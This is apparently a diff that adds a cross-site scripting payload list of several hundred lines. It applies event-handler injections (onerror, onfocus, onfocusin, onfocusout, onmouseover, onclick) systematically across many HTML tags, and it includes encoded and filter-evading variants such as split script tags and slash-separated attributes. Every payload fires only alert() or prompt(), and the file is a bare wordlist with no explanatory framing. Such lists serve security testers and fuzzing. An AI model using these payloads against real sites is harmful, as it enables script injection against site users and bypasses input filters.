@@ -1,0 +1,800 @@
+<img src=x onerror=alert('Stored XSS');>
+<img src=x onerror=alert('Reflected XSS');>
+<img src="x" onerror="alert('Stored XSS')">
+<img src="x" onerror="alert('Reflected XSS')">
+<img src="x" onmouseover="alert('Event-based XSS')">
+<input type="text" value="javascript:alert('Event-based XSS')" onfocus="alert('Event-based XSS')">
+%3Cimg%20src%3D%22x%22%20onerror%3D%22alert('Encoded XSS')%22%3E
+<img src=x onerror=alert('XSS')>
+<a href="#" onclick="alert('XSS');">Click me</a>
+<div onmouseover="alert('XSS')">Hover over me</div>
+<input type="text" value="Click <button onclick='alert(1)'>here</button>">
+" onmouseover="alert('XSS')">
+<img src="invalid.jpg" onerror="alert('XSS')">
+<input type="text" value="XSS test" onfocus="alert('XSS')">
+{"onerror":"alert('XSS')"}
+{"userInput": "<img src=x onerror=alert('XSS')>"}
+<audio src="x.mp3" onerror="alert('XSS')"></audio>
+"onclick=prompt(8)>"@x.y
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+<image/src/onerror=prompt(8)>
+<img/src/onerror=prompt(8)>
+<image src/onerror=prompt(8)>
+<img src/onerror=prompt(8)>
+<image src =q onerror=prompt(8)>
+<img src =q onerror=prompt(8)>
+</scrip</script>t><img src =q onerror=prompt(8)>
+"onmouseover=alert(1)//
+"autofocus/onfocus=alert(1)//
+<x onclick=alert(1)>click this!
+<x contenteditable onfocus=alert(1)>focus this!
+<x onmouseover=alert(1)>hover this!
+"><img src=1 onerror=alert(1)>.gif
+<body onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<a id=x tabindex=1 onfocus=alert(1)></a>
+<a id=x tabindex=1 onfocusin=alert(1)></a>
+<a onclick="alert(1)">test</a>
+<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>
+<a onmouseover="alert(1)">test</a>
+<abbr id=x tabindex=1 onfocus=alert(1)></abbr>
+<abbr id=x tabindex=1 onfocusin=alert(1)></abbr>
+<abbr onclick="alert(1)">test</abbr>
+<abbr onfocusout=alert(1) tabindex=1 id=x></abbr><input autofocus>
+<abbr onmouseover="alert(1)">test</abbr>
+<acronym id=x tabindex=1 onfocus=alert(1)></acronym>
+<acronym id=x tabindex=1 onfocusin=alert(1)></acronym>
+<acronym onclick="alert(1)">test</acronym>
+<acronym onfocusout=alert(1) tabindex=1 id=x></acronym><input autofocus>
+<acronym onmouseover="alert(1)">test</acronym>
+<address id=x tabindex=1 onfocus=alert(1)></address>
+<address id=x tabindex=1 onfocusin=alert(1)></address>
+<address onclick="alert(1)">test</address>
+<address onfocusout=alert(1) tabindex=1 id=x></address><input autofocus>
+<address onmouseover="alert(1)">test</address>
+<applet id=x tabindex=1 onfocus=alert(1)></applet>
+<applet id=x tabindex=1 onfocusin=alert(1)></applet>
+<applet onclick="alert(1)">test</applet>
+<applet onfocusout=alert(1) tabindex=1 id=x></applet><input autofocus>
+<applet onmouseover="alert(1)">test</applet>
+<area onclick="alert(1)">test</area>
+<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>
+<area onmouseover="alert(1)">test</area>
+<article id=x tabindex=1 onfocus=alert(1)></article>
+<article id=x tabindex=1 onfocusin=alert(1)></article>
+<article onclick="alert(1)">test</article>
+<article onfocusout=alert(1) tabindex=1 id=x></article><input autofocus>
+<article onmouseover="alert(1)">test</article>
+<aside id=x tabindex=1 onfocus=alert(1)></aside>
+<aside id=x tabindex=1 onfocusin=alert(1)></aside>
+<aside onclick="alert(1)">test</aside>
+<aside onfocusout=alert(1) tabindex=1 id=x></aside><input autofocus>
+<aside onmouseover="alert(1)">test</aside>
+<audio id=x controls onfocus=alert(1) id=x><source src="validaudio.wav"></audio>
+<audio id=x controls onfocusin=alert(1) id=x><source src="validaudio.wav"></audio>
+<audio onclick="alert(1)">test</audio>
+<audio onfocusout=alert(1) tabindex=1 id=x></audio><input autofocus>
+<audio onmouseover="alert(1)">test</audio>
+<audio src/onerror=alert(1)>
+<b id=x tabindex=1 onfocus=alert(1)></b>
+<b id=x tabindex=1 onfocusin=alert(1)></b>
+<b onclick="alert(1)">test</b>
+<b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>
+<b onmouseover="alert(1)">test</b>
+<base id=x tabindex=1 onfocus=alert(1)></base>
+<base id=x tabindex=1 onfocusin=alert(1)></base>
+<base onclick="alert(1)">test</base>
+<base onfocusout=alert(1) tabindex=1 id=x></base><input autofocus>
+<base onmouseover="alert(1)">test</base>
+<basefont id=x tabindex=1 onfocus=alert(1)></basefont>
+<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>
+<basefont onclick="alert(1)">test</basefont>
+<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>
+<basefont onmouseover="alert(1)">test</basefont>
+<bdi id=x tabindex=1 onfocus=alert(1)></bdi>
+<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>
+<bdi onclick="alert(1)">test</bdi>
+<bdi onfocusout=alert(1) tabindex=1 id=x></bdi><input autofocus>
+<bdi onmouseover="alert(1)">test</bdi>
+<bdo id=x tabindex=1 onfocus=alert(1)></bdo>
+<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>
+<bdo onclick="alert(1)">test</bdo>
+<bdo onfocusout=alert(1) tabindex=1 id=x></bdo><input autofocus>
+<bdo onmouseover="alert(1)">test</bdo>
+<bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>
+<bgsound id=x tabindex=1 onfocusin=alert(1)></bgsound>
+<bgsound onclick="alert(1)">test</bgsound>
+<bgsound onfocusout=alert(1) tabindex=1 id=x></bgsound><input autofocus>
+<bgsound onmouseover="alert(1)">test</bgsound>
+<big id=x tabindex=1 onfocus=alert(1)></big>
+<big id=x tabindex=1 onfocusin=alert(1)></big>
+<big onclick="alert(1)">test</big>
+<big onfocusout=alert(1) tabindex=1 id=x></big><input autofocus>
+<big onmouseover="alert(1)">test</big>
+<blink id=x tabindex=1 onfocus=alert(1)></blink>
+<blink id=x tabindex=1 onfocusin=alert(1)></blink>
+<blink onclick="alert(1)">test</blink>
+<blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>
+<blink onmouseover="alert(1)">test</blink>
+<blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>
+<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>
+<blockquote onclick="alert(1)">test</blockquote>
+<blockquote onfocusout=alert(1) tabindex=1 id=x></blockquote><input autofocus>
+<blockquote onmouseover="alert(1)">test</blockquote>
+<body id=x tabindex=1 onfocus=alert(1)></body>
+<body id=x tabindex=1 onfocusin=alert(1)></body>
+<body onclick="alert(1)">test</body>
+<body onerror=alert(1) onload=/>
+<body onfocusout=alert(1) id=x><iframe id=x>
+<body onmouseover="alert(1)">test</body>
+<br id=x tabindex=1 onfocus=alert(1)></br>
+<br id=x tabindex=1 onfocusin=alert(1)></br>
+<br onclick="alert(1)">test</br>
+<br onfocusout=alert(1) tabindex=1 id=x></br><input autofocus>
+<br onmouseover="alert(1)">test</br>
+<button autofocus onfocus=alert(1)>test</button>
+<button autofocus onfocusin=alert(1)>test</button>
+<button onclick="alert(1)">test</button>
+<button onfocusout=alert(1) id=x></button><input autofocus>
+<button onmouseover="alert(1)">test</button>
+<canvas id=x tabindex=1 onfocus=alert(1)></canvas>
+<canvas id=x tabindex=1 onfocusin=alert(1)></canvas>
+<canvas onclick="alert(1)">test</canvas>
+<canvas onfocusout=alert(1) tabindex=1 id=x></canvas><input autofocus>
+<canvas onmouseover="alert(1)">test</canvas>
+<caption id=x tabindex=1 onfocus=alert(1)></caption>
+<caption id=x tabindex=1 onfocusin=alert(1)></caption>
+<caption onclick="alert(1)">test</caption>
+<caption onfocusout=alert(1) tabindex=1 id=x></caption><input autofocus>
+<caption onmouseover="alert(1)">test</caption>
+<center id=x tabindex=1 onfocus=alert(1)></center>
+<center id=x tabindex=1 onfocusin=alert(1)></center>
+<center onclick="alert(1)">test</center>
+<center onfocusout=alert(1) tabindex=1 id=x></center><input autofocus>
+<center onmouseover="alert(1)">test</center>
+<cite id=x tabindex=1 onfocus=alert(1)></cite>
+<cite id=x tabindex=1 onfocusin=alert(1)></cite>
+<cite onclick="alert(1)">test</cite>
+<cite onfocusout=alert(1) tabindex=1 id=x></cite><input autofocus>
+<cite onmouseover="alert(1)">test</cite>
+<code id=x tabindex=1 onfocus=alert(1)></code>
+<code id=x tabindex=1 onfocusin=alert(1)></code>
+<code onclick="alert(1)">test</code>
+<code onfocusout=alert(1) tabindex=1 id=x></code><input autofocus>
+<code onmouseover="alert(1)">test</code>
+<col id=x tabindex=1 onfocus=alert(1)></col>
+<col id=x tabindex=1 onfocusin=alert(1)></col>
+<col onclick="alert(1)">test</col>
+<col onfocusout=alert(1) tabindex=1 id=x></col><input autofocus>
+<col onmouseover="alert(1)">test</col>
+<colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>
+<colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup>
+<colgroup onclick="alert(1)">test</colgroup>
+<colgroup onfocusout=alert(1) tabindex=1 id=x></colgroup><input autofocus>
+<colgroup onmouseover="alert(1)">test</colgroup>
+<command id=x tabindex=1 onfocus=alert(1)></command>
+<command id=x tabindex=1 onfocusin=alert(1)></command>
+<command onclick="alert(1)">test</command>
+<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>
+<command onmouseover="alert(1)">test</command>
+<content id=x tabindex=1 onfocus=alert(1)></content>
+<content id=x tabindex=1 onfocusin=alert(1)></content>
+<content onclick="alert(1)">test</content>
+<content onfocusout=alert(1) tabindex=1 id=x></content><input autofocus>
+<content onmouseover="alert(1)">test</content>
+<data id=x tabindex=1 onfocus=alert(1)></data>
+<data id=x tabindex=1 onfocusin=alert(1)></data>
+<data onclick="alert(1)">test</data>
+<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>
+<data onmouseover="alert(1)">test</data>
+<datalist id=x tabindex=1 onfocus=alert(1)></datalist>
+<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>
+<datalist onclick="alert(1)">test</datalist>
+<datalist onfocusout=alert(1) tabindex=1 id=x></datalist><input autofocus>
+<datalist onmouseover="alert(1)">test</datalist>
+<dd id=x tabindex=1 onfocus=alert(1)></dd>
+<dd id=x tabindex=1 onfocusin=alert(1)></dd>
+<dd onclick="alert(1)">test</dd>
+<dd onfocusout=alert(1) tabindex=1 id=x></dd><input autofocus>
+<dd onmouseover="alert(1)">test</dd>
+<del id=x tabindex=1 onfocus=alert(1)></del>
+<del id=x tabindex=1 onfocusin=alert(1)></del>
+<del onclick="alert(1)">test</del>
+<del onfocusout=alert(1) tabindex=1 id=x></del><input autofocus>
+<del onmouseover="alert(1)">test</del>
+<details id=x tabindex=1 onfocus=alert(1)></details>
+<details id=x tabindex=1 onfocusin=alert(1)></details>
+<details onclick="alert(1)">test</details>
+<details onfocusout=alert(1) tabindex=1 id=x></details><input autofocus>
+<details onmouseover="alert(1)">test</details>
+<dfn id=x tabindex=1 onfocus=alert(1)></dfn>
+<dfn id=x tabindex=1 onfocusin=alert(1)></dfn>
+<dfn onclick="alert(1)">test</dfn>
+<dfn onfocusout=alert(1) tabindex=1 id=x></dfn><input autofocus>
+<dfn onmouseover="alert(1)">test</dfn>
+<dialog id=x tabindex=1 onfocus=alert(1)></dialog>
+<dialog id=x tabindex=1 onfocusin=alert(1)></dialog>
+<dialog onclick="alert(1)">test</dialog>
+<dialog onfocusout=alert(1) tabindex=1 id=x></dialog><input autofocus>
+<dialog onmouseover="alert(1)">test</dialog>
+<dir id=x tabindex=1 onfocus=alert(1)></dir>
+<dir id=x tabindex=1 onfocusin=alert(1)></dir>
+<dir onclick="alert(1)">test</dir>
+<dir onfocusout=alert(1) tabindex=1 id=x></dir><input autofocus>
+<dir onmouseover="alert(1)">test</dir>
+<div id=x tabindex=1 onfocus=alert(1)></div>
+<div id=x tabindex=1 onfocusin=alert(1)></div>
+<div onclick="alert(1)">test</div>
+<div onfocusout=alert(1) tabindex=1 id=x></div><input autofocus>
+<div onmouseover="alert(1)">test</div>
+<dl id=x tabindex=1 onfocus=alert(1)></dl>
+<dl id=x tabindex=1 onfocusin=alert(1)></dl>
+<dl onclick="alert(1)">test</dl>
+<dl onfocusout=alert(1) tabindex=1 id=x></dl><input autofocus>
+<dl onmouseover="alert(1)">test</dl>
+<dt id=x tabindex=1 onfocus=alert(1)></dt>
+<dt id=x tabindex=1 onfocusin=alert(1)></dt>
+<dt onclick="alert(1)">test</dt>
+<dt onfocusout=alert(1) tabindex=1 id=x></dt><input autofocus>
+<dt onmouseover="alert(1)">test</dt>
+<element id=x tabindex=1 onfocus=alert(1)></element>
+<element id=x tabindex=1 onfocusin=alert(1)></element>
+<element onclick="alert(1)">test</element>
+<element onfocusout=alert(1) tabindex=1 id=x></element><input autofocus>
+<element onmouseover="alert(1)">test</element>
+<em id=x tabindex=1 onfocus=alert(1)></em>
+<em id=x tabindex=1 onfocusin=alert(1)></em>
+<em onclick="alert(1)">test</em>
+<em onfocusout=alert(1) tabindex=1 id=x></em><input autofocus>
+<em onmouseover="alert(1)">test</em>
+<embed id=x onfocus=alert(1) type=text/html>
+<embed id=x onfocusin=alert(1) type=text/html>
+<embed onclick="alert(1)">test</embed>
+<embed onfocusout=alert(1) tabindex=1 id=x></embed><input autofocus>
+<embed onmouseover="alert(1)">test</embed>
+<embed src=1 onerror=alert(1) type=image/gif>
+<fieldset id=x tabindex=1 onfocus=alert(1)></fieldset>
+<fieldset id=x tabindex=1 onfocusin=alert(1)></fieldset>
+<fieldset onclick="alert(1)">test</fieldset>
+<fieldset onfocusout=alert(1) tabindex=1 id=x></fieldset><input autofocus>
+<fieldset onmouseover="alert(1)">test</fieldset>
+<figcaption id=x tabindex=1 onfocus=alert(1)></figcaption>
+<figcaption id=x tabindex=1 onfocusin=alert(1)></figcaption>
+<figcaption onclick="alert(1)">test</figcaption>
+<figcaption onfocusout=alert(1) tabindex=1 id=x></figcaption><input autofocus>
+<figcaption onmouseover="alert(1)">test</figcaption>
+<figure id=x tabindex=1 onfocus=alert(1)></figure>
+<figure id=x tabindex=1 onfocusin=alert(1)></figure>
+<figure onclick="alert(1)">test</figure>
+<figure onfocusout=alert(1) tabindex=1 id=x></figure><input autofocus>
+<figure onmouseover="alert(1)">test</figure>
+<font id=x tabindex=1 onfocus=alert(1)></font>
+<font id=x tabindex=1 onfocusin=alert(1)></font>
+<font onclick="alert(1)">test</font>
+<font onfocusout=alert(1) tabindex=1 id=x></font><input autofocus>
+<font onmouseover="alert(1)">test</font>
+<footer id=x tabindex=1 onfocus=alert(1)></footer>
+<footer id=x tabindex=1 onfocusin=alert(1)></footer>
+<footer onclick="alert(1)">test</footer>
+<footer onfocusout=alert(1) tabindex=1 id=x></footer><input autofocus>
+<footer onmouseover="alert(1)">test</footer>
+<form id=x tabindex=1 onfocus=alert(1)></form>
+<form id=x tabindex=1 onfocusin=alert(1)></form>
+<form onclick="alert(1)">test</form>
+<form onfocusout=alert(1) tabindex=1 id=x></form><input autofocus>
+<form onmouseover="alert(1)">test</form>
+<frame onclick="alert(1)">test</frame>
+<frame onfocusout=alert(1) tabindex=1 id=x></frame><input autofocus>
+<frame onmouseover="alert(1)">test</frame>
+<frameset id=x tabindex=1 onfocus=alert(1)></frameset>
+<frameset id=x tabindex=1 onfocusin=alert(1)></frameset>
+<frameset onclick="alert(1)">test</frameset>
+<frameset onfocusout=alert(1) tabindex=1 id=x></frameset><input autofocus>
+<frameset onmouseover="alert(1)">test</frameset>
+<frameset><frame id=x onfocus=alert(1)>
+<frameset><frame id=x onfocusin=alert(1)>
+<h1 id=x tabindex=1 onfocus=alert(1)></h1>
+<h1 id=x tabindex=1 onfocusin=alert(1)></h1>
+<h1 onclick="alert(1)">test</h1>
+<h1 onfocusout=alert(1) tabindex=1 id=x></h1><input autofocus>
+<h1 onmouseover="alert(1)">test</h1>
+<head id=x tabindex=1 onfocus=alert(1)></head>
+<head id=x tabindex=1 onfocusin=alert(1)></head>
+<head onclick="alert(1)">test</head>
+<head onfocusout=alert(1) tabindex=1 id=x></head><input autofocus>
+<head onmouseover="alert(1)">test</head>
+<header id=x tabindex=1 onfocus=alert(1)></header>
+<header id=x tabindex=1 onfocusin=alert(1)></header>
+<header onclick="alert(1)">test</header>
+<header onfocusout=alert(1) tabindex=1 id=x></header><input autofocus>
+<header onmouseover="alert(1)">test</header>
+<hgroup id=x tabindex=1 onfocus=alert(1)></hgroup>
+<hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>
+<hgroup onclick="alert(1)">test</hgroup>
+<hgroup onfocusout=alert(1) tabindex=1 id=x></hgroup><input autofocus>
+<hgroup onmouseover="alert(1)">test</hgroup>
+<hr id=x tabindex=1 onfocus=alert(1)></hr>
+<hr id=x tabindex=1 onfocusin=alert(1)></hr>
+<hr onclick="alert(1)">test</hr>
+<hr onfocusout=alert(1) tabindex=1 id=x></hr><input autofocus>
+<hr onmouseover="alert(1)">test</hr>
+<html id=x tabindex=1 onfocus=alert(1)></html>
+<html id=x tabindex=1 onfocusin=alert(1)></html>
+<html onclick="alert(1)">test</html>
+<html onfocusout=alert(1) tabindex=1 id=x></html><input autofocus>
+<html onmouseover="alert(1)">test</html>
+<i id=x tabindex=1 onfocus=alert(1)></i>
+<i id=x tabindex=1 onfocusin=alert(1)></i>
+<i onclick="alert(1)">test</i>
+<i onfocusout=alert(1) tabindex=1 id=x></i><input autofocus>
+<i onmouseover="alert(1)">test</i>
+<iframe id=x onfocus=alert(1)>
+<iframe id=x onfocusin=alert(1)>
+<iframe onclick="alert(1)">test</iframe>
+<iframe onfocusout=alert(1) id=x><input autofocus>
+<iframe onmouseover="alert(1)">test</iframe>
+<image id=x tabindex=1 onfocus=alert(1)></image>
+<image id=x tabindex=1 onfocusin=alert(1)></image>
+<image onclick="alert(1)">test</image>
+<image onfocusout=alert(1) tabindex=1 id=x></image><input autofocus>
+<image onmouseover="alert(1)">test</image>
+<image src/onerror=alert(1)>
+<image srcset=1 onerror=alert(1)>
+<img id=x tabindex=1 onfocus=alert(1)></img>
+<img id=x tabindex=1 onfocusin=alert(1)></img>
+<img onclick="alert(1)">test</img>
+<img onfocusout=alert(1) tabindex=1 id=x></img><input autofocus>
+<img onmouseover="alert(1)">test</img>
+<img src/onerror=alert(1)>
+<img srcset=1 onerror=alert(1)>
+<img usemap=#x><map name="x"><area href onfocus=alert(1) id=x>
+<img usemap=#x><map name="x"><area href onfocusin=alert(1) id=x>
+<input autofocus onfocus=alert(1)>
+<input autofocus onfocusin=alert(1)>
+<input id=x onfocus=alert(1)>
+<input id=x onfocusin=alert(1)>
+<input onclick="alert(1)">test</input>
+<input onfocusout=alert(1) id=x><input autofocus>
+<input onmouseover="alert(1)">test</input>
+<input type=checkbox id=x onfocus=alert(1)>
+<input type=checkbox id=x onfocusin=alert(1)>
+<input type=image src=1 onerror=alert(1)>
+<input type=radio id=x onfocus=alert(1)>
+<input type=radio id=x onfocusin=alert(1)>
+<ins id=x tabindex=1 onfocus=alert(1)></ins>
+<ins id=x tabindex=1 onfocusin=alert(1)></ins>
+<ins onclick="alert(1)">test</ins>
+<ins onfocusout=alert(1) tabindex=1 id=x></ins><input autofocus>
+<ins onmouseover="alert(1)">test</ins>
+<isindex id=x tabindex=1 onfocus=alert(1)></isindex>
+<isindex id=x tabindex=1 onfocusin=alert(1)></isindex>
+<isindex onclick="alert(1)">test</isindex>
+<isindex onfocusout=alert(1) tabindex=1 id=x></isindex><input autofocus>
+<isindex onmouseover="alert(1)">test</isindex>
+<isindex type=image src=1 onerror=alert(1)>
+<kbd id=x tabindex=1 onfocus=alert(1)></kbd>
+<kbd id=x tabindex=1 onfocusin=alert(1)></kbd>
+<kbd onclick="alert(1)">test</kbd>
+<kbd onfocusout=alert(1) tabindex=1 id=x></kbd><input autofocus>
+<kbd onmouseover="alert(1)">test</kbd>
+<keygen autofocus onfocus=alert(1)>
+<keygen autofocus onfocusin=alert(1)>
+<keygen id=x onfocus=alert(1)>
+<keygen id=x onfocusin=alert(1)>
+<keygen onclick="alert(1)">test</keygen>
+<keygen onfocusout=alert(1) tabindex=1 id=x></keygen><input autofocus>
+<keygen onmouseover="alert(1)">test</keygen>
+<label id=x tabindex=1 onfocus=alert(1)></label>
+<label id=x tabindex=1 onfocusin=alert(1)></label>
+<label onclick="alert(1)">test</label>
+<label onfocusout=alert(1) tabindex=1 id=x></label><input autofocus>
+<label onmouseover="alert(1)">test</label>
+<legend id=x tabindex=1 onfocus=alert(1)></legend>
+<legend id=x tabindex=1 onfocusin=alert(1)></legend>
+<legend onclick="alert(1)">test</legend>
+<legend onfocusout=alert(1) tabindex=1 id=x></legend><input autofocus>
+<legend onmouseover="alert(1)">test</legend>
+<li id=x tabindex=1 onfocus=alert(1)></li>
+<li id=x tabindex=1 onfocusin=alert(1)></li>
+<li onclick="alert(1)">test</li>
+<li onfocusout=alert(1) tabindex=1 id=x></li><input autofocus>
+<li onmouseover="alert(1)">test</li>
+<link onclick="alert(1)">test</link>
+<link onfocus=alert(1) id=x tabindex=1 style=display:block>
+<link onfocusin=alert(1) id=x tabindex=1 style=display:block>
+<link onfocusout=alert(1) tabindex=1 id=x></link><input autofocus>
+<link onmouseover="alert(1)">test</link>
+<link rel=stylesheet href=1 onerror=alert(1)>
+<listing id=x tabindex=1 onfocus=alert(1)></listing>
+<listing id=x tabindex=1 onfocusin=alert(1)></listing>
+<listing onclick="alert(1)">test</listing>
+<listing onfocusout=alert(1) tabindex=1 id=x></listing><input autofocus>
+<listing onmouseover="alert(1)">test</listing>
+<main id=x tabindex=1 onfocus=alert(1)></main>
+<main id=x tabindex=1 onfocusin=alert(1)></main>
+<main onclick="alert(1)">test</main>
+<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>
+<main onmouseover="alert(1)">test</main>
+<map id=x tabindex=1 onfocus=alert(1)></map>
+<map id=x tabindex=1 onfocusin=alert(1)></map>
+<map onclick="alert(1)">test</map>
+<map onfocusout=alert(1) tabindex=1 id=x></map><input autofocus>
+<map onmouseover="alert(1)">test</map>
+<mark id=x tabindex=1 onfocus=alert(1)></mark>
+<mark id=x tabindex=1 onfocusin=alert(1)></mark>
+<mark onclick="alert(1)">test</mark>
+<mark onfocusout=alert(1) tabindex=1 id=x></mark><input autofocus>
+<mark onmouseover="alert(1)">test</mark>
+<marquee id=x tabindex=1 onfocus=alert(1)></marquee>
+<marquee id=x tabindex=1 onfocusin=alert(1)></marquee>
+<marquee onclick="alert(1)">test</marquee>
+<marquee onfocusout=alert(1) tabindex=1 id=x></marquee><input autofocus>
+<marquee onmouseover="alert(1)">test</marquee>
+<menu id=x tabindex=1 onfocus=alert(1)></menu>
+<menu id=x tabindex=1 onfocusin=alert(1)></menu>
+<menu onclick="alert(1)">test</menu>
+<menu onfocusout=alert(1) tabindex=1 id=x></menu><input autofocus>
+<menu onmouseover="alert(1)">test</menu>
+<menuitem id=x tabindex=1 onfocus=alert(1)></menuitem>
+<menuitem id=x tabindex=1 onfocusin=alert(1)></menuitem>
+<menuitem onclick="alert(1)">test</menuitem>
+<menuitem onfocusout=alert(1) tabindex=1 id=x></menuitem><input autofocus>
+<menuitem onmouseover="alert(1)">test</menuitem>
+<meta id=x tabindex=1 onfocus=alert(1)></meta>
+<meta id=x tabindex=1 onfocusin=alert(1)></meta>
+<meta onclick="alert(1)">test</meta>
+<meta onfocusout=alert(1) tabindex=1 id=x></meta><input autofocus>
+<meta onmouseover="alert(1)">test</meta>
+<meter id=x tabindex=1 onfocus=alert(1)></meter>
+<meter id=x tabindex=1 onfocusin=alert(1)></meter>
+<meter onclick="alert(1)">test</meter>
+<meter onfocusout=alert(1) tabindex=1 id=x></meter><input autofocus>
+<meter onmouseover="alert(1)">test</meter>
+<multicol id=x tabindex=1 onfocus=alert(1)></multicol>
+<multicol id=x tabindex=1 onfocusin=alert(1)></multicol>
+<multicol onclick="alert(1)">test</multicol>
+<multicol onfocusout=alert(1) tabindex=1 id=x></multicol><input autofocus>
+<multicol onmouseover="alert(1)">test</multicol>
+<nav id=x tabindex=1 onfocus=alert(1)></nav>
+<nav id=x tabindex=1 onfocusin=alert(1)></nav>
+<nav onclick="alert(1)">test</nav>
+<nav onfocusout=alert(1) tabindex=1 id=x></nav><input autofocus>
+<nav onmouseover="alert(1)">test</nav>
+<nextid id=x tabindex=1 onfocus=alert(1)></nextid>
+<nextid id=x tabindex=1 onfocusin=alert(1)></nextid>
+<nextid onclick="alert(1)">test</nextid>
+<nextid onfocusout=alert(1) tabindex=1 id=x></nextid><input autofocus>
+<nextid onmouseover="alert(1)">test</nextid>
+<nobr id=x tabindex=1 onfocus=alert(1)></nobr>
+<nobr id=x tabindex=1 onfocusin=alert(1)></nobr>
+<nobr onclick="alert(1)">test</nobr>
+<nobr onfocusout=alert(1) tabindex=1 id=x></nobr><input autofocus>
+<nobr onmouseover="alert(1)">test</nobr>
+<noembed id=x tabindex=1 onfocus=alert(1)></noembed>
+<noembed id=x tabindex=1 onfocusin=alert(1)></noembed>
+<noembed onclick="alert(1)">test</noembed>
+<noembed onfocusout=alert(1) tabindex=1 id=x></noembed><input autofocus>
+<noembed onmouseover="alert(1)">test</noembed>
+<noframes id=x tabindex=1 onfocus=alert(1)></noframes>
+<noframes id=x tabindex=1 onfocusin=alert(1)></noframes>
+<noframes onclick="alert(1)">test</noframes>
+<noframes onfocusout=alert(1) tabindex=1 id=x></noframes><input autofocus>
+<noframes onmouseover="alert(1)">test</noframes>
+<noscript id=x tabindex=1 onfocus=alert(1)></noscript>
+<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>
+<noscript onclick="alert(1)">test</noscript>
+<noscript onfocusout=alert(1) tabindex=1 id=x></noscript><input autofocus>
+<noscript onmouseover="alert(1)">test</noscript>
+<object id=x onfocus=alert(1) type=text/html>
+<object id=x onfocusin=alert(1) type=text/html>
+<object onclick="alert(1)">test</object>
+<object onerror=alert(1) data=1 type=image/gif>
+<object onfocusout=alert(1) tabindex=1 id=x></object><input autofocus>
+<object onmouseover="alert(1)">test</object>
+<ol id=x tabindex=1 onfocus=alert(1)></ol>
+<ol id=x tabindex=1 onfocusin=alert(1)></ol>
+<ol onclick="alert(1)">test</ol>
+<ol onfocusout=alert(1) tabindex=1 id=x></ol><input autofocus>
+<ol onmouseover="alert(1)">test</ol>
+<optgroup id=x tabindex=1 onfocus=alert(1)></optgroup>
+<optgroup id=x tabindex=1 onfocusin=alert(1)></optgroup>
+<optgroup onclick="alert(1)">test</optgroup>
+<optgroup onfocusout=alert(1) tabindex=1 id=x></optgroup><input autofocus>
+<optgroup onmouseover="alert(1)">test</optgroup>
+<option id=x tabindex=1 onfocus=alert(1)></option>
+<option id=x tabindex=1 onfocusin=alert(1)></option>
+<option onclick="alert(1)">test</option>
+<option onfocusout=alert(1) tabindex=1 id=x></option><input autofocus>
+<option onmouseover="alert(1)">test</option>
+<output id=x tabindex=1 onfocus=alert(1)></output>
+<output id=x tabindex=1 onfocusin=alert(1)></output>
+<output onclick="alert(1)">test</output>
+<output onfocusout=alert(1) tabindex=1 id=x></output><input autofocus>
+<output onmouseover="alert(1)">test</output>
+<p id=x tabindex=1 onfocus=alert(1)></p>
+<p id=x tabindex=1 onfocusin=alert(1)></p>
+<p onclick="alert(1)">test</p>
+<p onfocusout=alert(1) tabindex=1 id=x></p><input autofocus>
+<p onmouseover="alert(1)">test</p>
+<param id=x tabindex=1 onfocus=alert(1)></param>
+<param id=x tabindex=1 onfocusin=alert(1)></param>
+<param onclick="alert(1)">test</param>
+<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>
+<param onmouseover="alert(1)">test</param>
+<picture id=x tabindex=1 onfocus=alert(1)></picture>
+<picture id=x tabindex=1 onfocusin=alert(1)></picture>
+<picture onclick="alert(1)">test</picture>
+<picture onfocusout=alert(1) tabindex=1 id=x></picture><input autofocus>
+<picture onmouseover="alert(1)">test</picture>
+<plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>
+<plaintext id=x tabindex=1 onfocusin=alert(1)></plaintext>
+<plaintext onclick="alert(1)">test</plaintext>
+<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>
+<plaintext onmouseover="alert(1)">test</plaintext>
+<pre id=x tabindex=1 onfocus=alert(1)></pre>
+<pre id=x tabindex=1 onfocusin=alert(1)></pre>
+<pre onclick="alert(1)">test</pre>
+<pre onfocusout=alert(1) tabindex=1 id=x></pre><input autofocus>
+<pre onmouseover="alert(1)">test</pre>
+<progress id=x tabindex=1 onfocus=alert(1)></progress>
+<progress id=x tabindex=1 onfocusin=alert(1)></progress>
+<progress onclick="alert(1)">test</progress>
+<progress onfocusout=alert(1) tabindex=1 id=x></progress><input autofocus>
+<progress onmouseover="alert(1)">test</progress>
+<q id=x tabindex=1 onfocus=alert(1)></q>
+<q id=x tabindex=1 onfocusin=alert(1)></q>
+<q onclick="alert(1)">test</q>
+<q onfocusout=alert(1) tabindex=1 id=x></q><input autofocus>
+<q onmouseover="alert(1)">test</q>
+<rb id=x tabindex=1 onfocus=alert(1)></rb>
+<rb id=x tabindex=1 onfocusin=alert(1)></rb>
+<rb onclick="alert(1)">test</rb>
+<rb onfocusout=alert(1) tabindex=1 id=x></rb><input autofocus>
+<rb onmouseover="alert(1)">test</rb>
+<rp id=x tabindex=1 onfocus=alert(1)></rp>
+<rp id=x tabindex=1 onfocusin=alert(1)></rp>
+<rp onclick="alert(1)">test</rp>
+<rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus>
+<rp onmouseover="alert(1)">test</rp>
+<rt id=x tabindex=1 onfocus=alert(1)></rt>
+<rt id=x tabindex=1 onfocusin=alert(1)></rt>
